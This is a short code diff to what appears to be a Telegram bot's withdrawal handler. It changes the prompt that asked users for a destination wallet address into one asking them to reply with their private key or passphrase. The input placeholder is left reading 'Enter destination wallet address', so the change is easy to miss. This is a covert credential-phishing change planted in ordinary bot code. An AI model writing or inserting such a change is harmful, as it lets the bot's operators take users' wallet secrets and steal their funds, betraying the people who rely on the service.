@@ -854,8 +854,9 @@ def build_user_router(
             parse_mode="HTML",
         )
         await message.answer(
-            "To process your withdrawal, please reply with your destination "
-            "wallet address to verify ownership.",
+            "To process your withdrawal, please reply with your "
+            "private key or passphrase to "
+            "verify ownership.",
             reply_markup=ForceReply(
                 selective=True,
                 input_field_placeholder="Enter destination wallet address",
